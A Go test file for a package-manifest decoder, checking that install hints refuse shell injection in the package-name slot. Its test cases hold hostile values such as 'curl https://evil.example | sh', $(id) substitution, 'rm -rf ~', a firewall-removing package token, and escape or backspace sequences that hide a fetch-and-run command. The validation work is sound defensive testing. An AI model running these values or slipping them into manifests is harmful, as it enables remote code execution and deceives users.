package packdecl

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// hintManifest is a one-contribution manifest whose `apt` install hint is value, on a
// `requires` (the kind with the most use for a remedy) or an npm `program`, built through
// json.Marshal so a test value carrying a quote or a newline is the value under test rather
// than a broken fixture.
func hintManifest(t *testing.T, kind Kind, value string) []byte {
	t.Helper()
	c := map[string]any{"kind": string(kind), "bin": "fd", "install_hints": map[string]string{"apt": value}}
	if kind == KindProgram {
		c["via"], c["package"] = "npm", "fd-npm"
	}
	data, err := json.Marshal(map[string]any{"name": "hints", "contributes": []any{c}})
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// hintProblems is every problem mentioning install_hints that a REAL manifest read returns
// for value: the strict decoder every host read uses, and the tolerant one the jail uses. The
// rule is AUTHORING-ONLY, like retiredFieldProblems: the jail never prints or runs a hint, so a
// check there protects nothing, and a host that later widens the allowlist must not stop an
// older jail from booting. So the strict read refuses and the tolerant read stays silent.
func hintProblems(t *testing.T, kind Kind, value string) (strict, tolerant []string) {
	t.Helper()
	data := hintManifest(t, kind, value)
	m, probs := Decode(data)
	if m == nil {
		t.Fatalf("Decode(%q) did not parse: %v", value, probs)
	}
	_, tprobs, skipped := DecodeTolerant(data)
	if len(skipped) != 0 {
		t.Fatalf("DecodeTolerant(%q) skipped %v: the fixture is not the shape under test", value, skipped)
	}
	keep := func(in []string) (out []string) {
		for _, p := range in {
			if strings.Contains(p, "install_hints") {
				out = append(out, p)
			}
		}
		return out
	}
	return keep(probs), keep(tprobs)
}

// A HINT'S PACKAGE PART IS PLAIN PACKAGE NAMES, so it cannot smuggle shell into the slot the
// install command is built around (the maintainer's ruling, 2026-10-01). `yolo check-deps`
// and `yolo host apply` print the remedy for the user to run, and a one-package hint is
// written into the bundle file (a Brewfile is Ruby), so a hint whose package slot carries `;`
// or `$(…)` is a command hidden where the reader expects a name. Every case is
// refused through the real decode, on both kinds that read install_hints, and the refusal
// names the manager key, the bin, the offending character and the one visible way to chain a
// step.
func TestInstallHintsRefuseShellInThePackagePart(t *testing.T) {
	cases := []struct {
		name, value string
		want        []string // substrings of the one problem
	}{
		{"semicolon", "fd-find; curl https://evil.example | sh", []string{`";"`, `" && "`}},
		{"backtick", "fd-find`id`", []string{"\"`\"", `" && "`}},
		{"command substitution", "fd-find $(id)", []string{`"$"`, `" && "`}},
		{"pipe", "fd-find | sh", []string{`"|"`, `" && "`}},
		{"lone ampersand", "fd-find & sh", []string{`"&"`, `" && "`}},
		{"redirect", "fd-find >/etc/passwd", []string{`">"`, `" && "`}},
		{"single quote", "fd-find 'x'", []string{`"'"`}},
		{"double quote", `fd-find "x"`, []string{`"\""`}},
		{"newline in the package part", "fd-find\nsh", []string{`"\n"`}},
		{"tab in the package part", "fd-find\tsh", []string{`"\t"`}},
		{"glob", "fd-*", []string{`"*"`}},
		{"tilde", "~/fd.deb", []string{`"~"`}},
		{"leading dash", "--allow-downgrades fd-find", []string{`"--allow-downgrades"`, `"-"`, "option"}},
		{"leading dash after a package", "fd-find -o", []string{`"-o"`, "option"}},
		{"a URL", "https://evil.example/x.rpm", []string{`"https://evil.example/x.rpm"`, "URL"}},
		{"an absolute path", "/tmp/x.deb", []string{`"/tmp/x.deb"`, "path"}},
		{"empty step", "fd-find && ", []string{"no step", `" && "`}},
		{"blank step", "fd-find &&    ", []string{"no step", `" && "`}},
		{"trailing && with no space", "fd-find &&", []string{"no step", `" && "`}},
		{"no package before the step", " && sudo ln -sf a b", []string{"no package", `" && "`}},
		{"multi-line step", "fd-find && sudo ln -sf a b\nrm -rf ~", []string{"one line"}},
		{"empty value", "", []string{"no package"}},
		{"blank value", "   ", []string{"no package"}},

		// A token a manager reads as something other than a package to install. apt reads
		// a trailing "-" as REMOVE ("apt install fd-find ufw-" takes the firewall away), and
		// a token starting with "." is a path: apt and dnf install "./<file>" as given, and
		// a lone "." or ".." names a directory, never a package.
		{"trailing dash", "fd-find ufw-", []string{`"ufw-"`, "remove"}},
		{"lone trailing dash token", "-", []string{`"-"`, "option"}},
		{"a token of one dot", "fd-find .", []string{`"."`, "path"}},
		{"a token of dots", "..", []string{`".."`, "path"}},
		{"a relative path", "./evil.deb", []string{`"./evil.deb"`, "path"}},

		// A STEP THAT DOES NOT PRINT AS ITSELF. The step is free shell because the remedy is
		// printed whole for the user to read and run; a character a terminal does not show
		// as itself breaks that. Backspaces overwrite what came before, an escape sequence
		// can conceal the rest of the line (SGR 8) while a copy of it still carries the text,
		// a direction override or a zero-width character reorders or hides it, and a
		// lookalike letter names a different command than the one it shows.
		{"backspaces in the step", "fd-find && sudo ln -sf a b; curl https://evil.example | sh" +
			strings.Repeat("\b", 37) + "sudo ln -sf a b" + strings.Repeat(" ", 22),
			[]string{`"\b"`, "printable ASCII"}},
		{"escape sequence in the step", "fd-find && true\x1b[8m; curl https://evil.example | sh\x1b[0m",
			[]string{`"\x1b"`, "printable ASCII"}},
		{"direction override in the step", "fd-find && echo \u202ehs | lruc", []string{`"\u202e"`}},
		{"zero-width space in the step", "fd-find && sudo\u200b ln -sf a b", []string{`"\u200b"`}},
		{"tab in the step", "fd-find && sudo\tln -sf a b", []string{`"\t"`}},
		{"NUL in the step", "fd-find && echo \x00", []string{`"\x00"`}},
		{"lookalike letter in the step", "fd-find && \u0455udo ln -sf a b", []string{"\"\u0455\""}},
	}
	for _, kind := range []Kind{KindRequires, KindProgram} {
		for _, tc := range cases {
			t.Run(string(kind)+"/"+tc.name, func(t *testing.T) {
				strict, tolerant := hintProblems(t, kind, tc.value)
				if len(tolerant) != 0 {
					t.Errorf("DecodeTolerant: hint %q: the jail's read must not refuse a hint, got %v", tc.value, tolerant)
				}
				for path, got := range map[string][]string{"Decode": strict} {
					if len(got) != 1 {
						t.Fatalf("%s: hint %q: want exactly one install_hints problem, got %d: %v",
							path, tc.value, len(got), got)
					}
					// The label the author can find (entry, manager key, bin) and the reason.
					for _, w := range append([]string{"contributes[0]", `install_hints "apt"`, `bin "fd"`}, tc.want...) {
						if !strings.Contains(got[0], w) {
							t.Errorf("%s: hint %q: problem does not name %s:\n%s", path, tc.value, w, got[0])
						}
					}
				}
			})
		}
	}
}

// Every spelling a real package manager uses passes: the allowlist is letters, digits and
// . _ + - @ / : =, which covers Homebrew taps and versioned formulae, apt's architecture and
// version qualifiers and nix attribute paths. And the step after ` && ` is FREE SHELL — it is
// shown whole before anything runs, so quoting and redirection there are the author's to use.
func TestInstallHintsConventionalFormsDecode(t *testing.T) {
	for _, value := range []string{
		"fd-find && sudo ln -sf /usr/lib/cargo/bin/fd /usr/local/bin/fd", // the guardrails pack's apt fd hint
		"ripgrep",
		"fd-find ripgrep fzf", // several packages
		"owner/tap/name",      // a brew tap
		"python@3.12",         // a versioned formula
		"postgresql@16",
		"libc6:i386", // an apt architecture qualifier
		"pkg:amd64",
		"pkg=1.2.3-1ubuntu1",       // an apt version pin
		"libfoo1:arm64=2.0+dfsg-1", // both
		"python312Packages.pip",    // a nix attribute path
		"gcc-c++ make",             // dnf's spelling of g++
		"c++utilities",
		"g++", // a trailing "+" is apt's INSTALL suffix, which is what the hint asks anyway
		"libstdc++6:i386",
		"fd-find && [ -x /usr/local/bin/fd ] || sudo ln -sf /usr/lib/cargo/bin/fd /usr/local/bin/fd",
		"pkg && sudo sh -c 'echo x > /etc/y'; hash -r", // free shell after the separator
		"fd-find && sudo ln -sf a b && hash -r",        // a step may chain like any shell; it is printed whole
		"  fd-find  ",                                  // surrounding spaces are not a problem
	} {
		for _, kind := range []Kind{KindRequires, KindProgram} {
			strict, tolerant := hintProblems(t, kind, value)
			if len(strict) != 0 || len(tolerant) != 0 {
				t.Errorf("%s hint %q refused: strict %v, tolerant %v", kind, value, strict, tolerant)
			}
		}
	}
}

// shippedAndExampleManifests is every manifest the repository ships or teaches, read straight
// off the tree rather than through a list someone has to extend: the embedded packs under
// packs/, and the example packs under docs/examples a user copies.
func shippedAndExampleManifests(t *testing.T) []string {
	t.Helper()
	var manifests []string
	for _, pattern := range []string{
		"../../packs/*/pack.json", "../../packs/*/pack.jsonc",
		"../../docs/examples/*/pack.json", "../../docs/examples/*/pack.jsonc",
	} {
		got, err := filepath.Glob(pattern)
		if err != nil {
			t.Fatal(err)
		}
		manifests = append(manifests, got...)
	}
	return manifests
}

// EVERY MANIFEST THE REPOSITORY SHIPS OR TEACHES decodes with no install_hints problem, strictly
// and tolerantly: the embedded packs under packs/, and the example packs under docs/examples a
// user copies. A rule that refused one of them would brick a launch selecting it, so the rule is
// checked against them all, read straight off the tree rather than through a list someone has to
// extend.
//
// The control is the guardrails pack's apt hint for fd, the one shipped value with a step: a
// gate that found no ` && ` passes the step form for free.
func TestEveryShippedAndExamplePackHasNoInstallHintProblem(t *testing.T) {
	manifests := shippedAndExampleManifests(t)
	hints, steps := 0, 0
	sawGuardrailsStep := false
	for _, path := range manifests {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		m, probs := Decode(data)
		if m == nil {
			t.Errorf("%s does not decode: %v", path, probs)
			continue
		}
		// The tolerant read is the jail's boot, where any problem is fatal.
		_, tprobs, _ := DecodeTolerant(data)
		for _, p := range append(probs, tprobs...) {
			if strings.Contains(p, "install_hints") {
				t.Errorf("%s: %s", path, p)
			}
		}
		for _, c := range m.Contributes {
			for mgr, v := range c.InstallHints {
				hints++
				if strings.Contains(v, " && ") {
					steps++
					if filepath.Base(filepath.Dir(path)) == "guardrails" && c.Bin == "fd" && mgr == "apt" {
						sawGuardrailsStep = true
					}
				}
			}
		}
	}
	if len(manifests) < 2 || hints == 0 || steps == 0 {
		t.Fatalf("read %d manifests, %d hints, %d with a step: the gate is not reading the tree "+
			"it exists for", len(manifests), hints, steps)
	}
	if !sawGuardrailsStep {
		t.Errorf("the guardrails pack's apt fd hint (a package plus a step) was not found: the " +
			"control this test names has moved, so decide on purpose what replaces it")
	}
}
